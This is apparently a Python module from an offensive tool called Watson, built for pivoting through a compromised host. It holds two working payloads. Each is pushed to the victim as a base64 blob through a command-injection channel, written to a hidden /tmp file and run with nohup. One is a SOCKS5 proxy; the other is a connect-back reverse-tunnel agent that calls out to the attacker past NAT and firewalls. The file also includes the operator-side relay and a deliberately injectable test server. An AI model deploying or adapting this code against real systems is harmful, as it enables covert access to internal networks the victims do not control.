"""SOCKS tunnel through the foothold — route Watson's traffic via the compromised host.

A tiny pure-Python SOCKS5 proxy is written to the foothold and started through the
exec channel; Watson then sends requests with socks5h://<foothold>:<port>, so probes
reach internal hosts *through* the foothold. No binary/arch issues (the foothold has
python). ponytail: CONNECT only, no auth — enough to pivot web/TCP.
"""
from __future__ import annotations

import base64
import time

# Minimal SOCKS5 (no-auth, CONNECT) relay. Deployed to the foothold and run there.
SOCKS_SERVER = r"""
import socket,threading,struct,sys
def pipe(a,b):
 def fwd(s,d):
  try:
   while True:
    x=s.recv(4096)
    if not x:break
    d.sendall(x)
  except Exception:pass
  finally:
   try:d.shutdown(socket.SHUT_WR)
   except Exception:pass
 t=threading.Thread(target=fwd,args=(a,b),daemon=True);t.start();fwd(b,a)
def handle(c):
 try:
  c.recv(262);c.sendall(b"\x05\x00")
  h=c.recv(4)
  if len(h)<4:return
  cmd,atyp=h[1],h[3]
  if atyp==1:addr=socket.inet_ntoa(c.recv(4))
  elif atyp==3:addr=c.recv(c.recv(1)[0]).decode()
  elif atyp==4:addr=socket.inet_ntop(socket.AF_INET6,c.recv(16))
  else:return
  port=struct.unpack(">H",c.recv(2))[0]
  if cmd!=1:c.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00");return
  try:r=socket.create_connection((addr,port),timeout=10)
  except Exception:c.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00");return
  c.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00");pipe(c,r)
 finally:
  c.close()
def main():
 p=int(sys.argv[1]) if len(sys.argv)>1 else 1080
 s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",p));s.listen(50)
 while True:
  c,_=s.accept();threading.Thread(target=handle,args=(c,),daemon=True).start()
main()
"""


def open_socks(channel, host: str, port: int = 1080, remote_path: str = "/tmp/.ms_socks.py") -> dict:
    """Deploy + start the SOCKS proxy on the foothold; return a requests `proxies` dict."""
    b64 = base64.b64encode(SOCKS_SERVER.encode()).decode()
    channel.run(f"echo {b64} | base64 -d > {remote_path}")
    channel.run(f"nohup python3 {remote_path} {port} >/dev/null 2>&1 & echo started")
    time.sleep(1.2)  # let it bind
    proxy = f"socks5h://{host}:{port}"
    return {"http": proxy, "https": proxy}


# ---------------------------------------------------------------------------
# Reverse tunnel — for a foothold Watson CANNOT connect to directly (behind NAT
# or an inbound-blocking firewall). The forward SOCKS above needs Watson to dial
# the foothold's listening port; here the foothold dials *out* to Watson instead.
#
# Watson runs two local listeners: a MASTER port the foothold's agent connects
# back to (a pool of idle callback connections), and a SOCKS5 port the operator's
# tools use (socks5h://127.0.0.1:<socks>). For each SOCKS request Watson hands the
# target host:port to one idle callback; the foothold opens it locally and relays.
# Same net effect as open_socks — probes reach internal hosts through the foothold
# — without any inbound connection to the foothold.
# ---------------------------------------------------------------------------

import queue  # noqa: E402
import socket  # noqa: E402
import struct  # noqa: E402
import threading  # noqa: E402

# Connect-back relay deployed to the foothold. Keeps a pool of outbound connections
# to Watson; each waits for a "host:port\n" target, connects locally, reports status
# (\x00 ok / \x01 fail), then relays bytes. On stream end it reconnects (stays idle).
REVERSE_AGENT = r"""
import socket,threading,sys,time
H=sys.argv[1];P=int(sys.argv[2]);POOL=int(sys.argv[3]) if len(sys.argv)>3 else 16
def pipe(a,b):
 def fwd(s,d):
  try:
   while True:
    x=s.recv(4096)
    if not x:break
    d.sendall(x)
  except Exception:pass
  finally:
   try:d.shutdown(socket.SHUT_WR)
   except Exception:pass
 t=threading.Thread(target=fwd,args=(a,b),daemon=True);t.start();fwd(b,a)
def worker():
 while True:
  try:c=socket.create_connection((H,P))
  except Exception:time.sleep(2);continue
  try:
   line=b""
   while not line.endswith(b"\n"):
    d=c.recv(1)
    if not d:raise IOError("closed")
    line+=d
   host,port=line.strip().decode().rsplit(":",1)
   try:
    r=socket.create_connection((host,int(port)),timeout=10);c.sendall(b"\x00")
   except Exception:
    c.sendall(b"\x01");c.close();continue
   pipe(c,r)
  except Exception:
   try:c.close()
   except Exception:pass
def main():
 for _ in range(POOL):threading.Thread(target=worker,daemon=True).start()
 while True:time.sleep(3600)
main()
"""


def local_ip() -> str:
    """Best-effort outbound IP of this host (what a foothold would dial back to)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))  # no packet sent for UDP; just picks the route's src
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def _recvn(sock, n: int) -> bytes:
    """Read exactly n bytes (SOCKS headers are tiny and must not short-read)."""
    buf = b""
    while len(buf) < n:
        d = sock.recv(n - len(buf))
        if not d:
            break
        buf += d
    return buf


def _pipe(a, b) -> None:
    def fwd(s, d):
        try:
            while True:
                x = s.recv(4096)
                if not x:
                    break
                d.sendall(x)
        except OSError:
            pass
        finally:
            try:
                d.shutdown(socket.SHUT_WR)
            except OSError:
                pass
    t = threading.Thread(target=fwd, args=(a, b), daemon=True)
    t.start()
    fwd(b, a)


class ReverseTunnel:
    """Watson-side of the reverse tunnel: a master listener the foothold dials back
    to, and a local SOCKS5 listener whose requests are relayed through those callbacks."""

    def __init__(self, socks_port: int = 1080, master_port: int = 8443,
                 master_bind: str = "0.0.0.0", worker_timeout: float = 20.0):
        self.socks_port = socks_port
        self.master_port = master_port
        self.master_bind = master_bind
        self.worker_timeout = worker_timeout
        self._idle: "queue.Queue" = queue.Queue()
        self._stop = threading.Event()
        self._socks: list = []  # listening sockets, closed on stop()

    def start(self) -> "ReverseTunnel":
        self._listen(self.master_bind, self.master_port, lambda c: self._idle.put(c))
        self._listen("127.0.0.1", self.socks_port, self._on_socks)
        return self

    def proxies(self) -> dict:
        proxy = f"socks5h://127.0.0.1:{self.socks_port}"
        return {"http": proxy, "https": proxy}

    def _listen(self, host: str, port: int, handler) -> None:
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((host, port))
        srv.listen(64)
        self._socks.append(srv)

        def loop():
            while not self._stop.is_set():
                try:
                    c, _ = srv.accept()
                except OSError:
                    break
                threading.Thread(target=handler, args=(c,), daemon=True).start()
        threading.Thread(target=loop, daemon=True).start()

    def _dispatch(self, host: str, port: int):
        """Hand a target to an idle callback; return the live relay socket or None.
        A dead/idle callback is skipped; a target the foothold can't reach fails fast."""
        spec = f"{host}:{port}\n".encode()
        for _ in range(3):
            try:
                w = self._idle.get(timeout=self.worker_timeout)
            except queue.Empty:
                return None
            try:
                w.sendall(spec)
                status = w.recv(1)
            except OSError:
                try:
                    w.close()
                except OSError:
                    pass
                continue  # stale callback — try the next idle one
            if status == b"\x00":
                return w
            try:
                w.close()  # foothold reached us but couldn't reach the target
            except OSError:
                pass
            return None
        return None

    def _on_socks(self, client) -> None:
        try:
            client.recv(262)  # SOCKS5 greeting (ver, nmethods, methods…)
            client.sendall(b"\x05\x00")  # no-auth
            h = _recvn(client, 4)
            if len(h) < 4:
                return
            cmd, atyp = h[1], h[3]
            if atyp == 1:
                host = socket.inet_ntoa(_recvn(client, 4))
            elif atyp == 3:
                host = _recvn(client, _recvn(client, 1)[0]).decode()
            elif atyp == 4:
                host = socket.inet_ntop(socket.AF_INET6, _recvn(client, 16))
            else:
                return
            port = struct.unpack(">H", _recvn(client, 2))[0]
            if cmd != 1:  # CONNECT only
                client.sendall(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
                return
            worker = self._dispatch(host, port)
            if worker is None:
                client.sendall(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")  # host unreachable
                return
            client.sendall(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")  # success
            _pipe(client, worker)
        except OSError:
            pass
        finally:
            try:
                client.close()
            except OSError:
                pass

    def stop(self) -> None:
        self._stop.set()
        for s in self._socks:
            try:
                s.close()
            except OSError:
                pass


def open_reverse_socks(channel, callback_host: str = "", socks_port: int = 1080,
                       master_port: int = 8443, pool: int = 16,
                       remote_path: str = "/tmp/.ms_rsocks.py") -> tuple["ReverseTunnel", dict]:
    """Start Watson's reverse-tunnel listeners, deploy + launch the connect-back agent on
    the foothold, and return (tunnel, proxies). The foothold dials back to callback_host:
    master_port (so it works from behind NAT); probes then route through socks_port locally."""
    cb = callback_host or local_ip()
    tunnel = ReverseTunnel(socks_port=socks_port, master_port=master_port).start()
    b64 = base64.b64encode(REVERSE_AGENT.encode()).decode()
    channel.run(f"echo {b64} | base64 -d > {remote_path}")
    channel.run(f"nohup python3 {remote_path} {cb} {master_port} {pool} >/dev/null 2>&1 & echo started")
    time.sleep(1.5)  # let the callback pool connect
    return tunnel, tunnel.proxies()


if __name__ == "__main__":  # self-check: python -m watson.pivot (real tunnels, local)
    import subprocess
    import sys
    import threading
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs, urlparse

    import requests

    # "internal" service — only to be reached through a tunnel
    class Intern(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"INTERNAL-OK")

        def log_message(self, *a):
            pass

    internal = HTTPServer(("127.0.0.1", 0), Intern)
    iport = internal.server_address[1]
    threading.Thread(target=internal.serve_forever, daemon=True).start()

    # --- reverse tunnel: the foothold dials BACK (agent run as a local subprocess) -------
    rt = ReverseTunnel(socks_port=11080, master_port=18443, master_bind="127.0.0.1").start()
    agent = subprocess.Popen([sys.executable, "-c", REVERSE_AGENT, "127.0.0.1", "18443", "4"])
    try:
        time.sleep(1.5)  # let the callback pool dial in
        r = requests.get(f"http://127.0.0.1:{iport}/", proxies=rt.proxies(), timeout=10)
        assert r.text == "INTERNAL-OK", r.text
    finally:
        agent.terminate()
        rt.stop()
    print("pivot self-check ok  (reverse tunnel established)")

    # --- forward SOCKS: Watson dials the foothold (needs the exec_channel module) --------
    try:
        from .exec_channel import CommandInjection
    except (ImportError, OSError) as e:
        print(f"pivot self-check: forward SOCKS skipped ({e})")
    else:
        class RCE(BaseHTTPRequestHandler):  # "foothold" — a command-injection sink
            def do_GET(self):
                host = parse_qs(urlparse(self.path).query).get("host", [""])[0]
                self.send_response(200)
                self.end_headers()
                self.wfile.write(subprocess.getoutput("echo r: " + host).encode())

            def log_message(self, *a):
                pass

        rce = HTTPServer(("127.0.0.1", 0), RCE)
        threading.Thread(target=rce.serve_forever, daemon=True).start()
        ch = CommandInjection(requests.Session(), f"http://127.0.0.1:{rce.server_address[1]}/x", "host")
        proxies = open_socks(ch, "127.0.0.1", 10800)
        r = requests.get(f"http://127.0.0.1:{iport}/", proxies=proxies, timeout=10)
        assert r.text == "INTERNAL-OK", r.text
        rce.shutdown()
        print("pivot self-check ok  (forward tunnel established)")

    internal.shutdown()
